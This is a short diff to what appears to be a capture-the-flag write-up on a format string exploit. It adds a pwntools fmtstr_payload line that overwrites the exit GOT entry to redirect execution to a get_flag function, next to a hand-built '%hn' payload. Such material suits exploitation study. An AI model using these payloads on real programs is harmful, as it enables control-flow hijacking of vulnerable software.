@@ -31,6 +31,13 @@ payload += "%{}x".format(0x8609 - 0x804)
 payload += "%1$hn"
 
 
+
+######################################################
+## pwntools 
+######################################################
+offset = 1
+payload = fmtstr_payload(offset, {exit_got: get_flag})
+
 ```
 
 
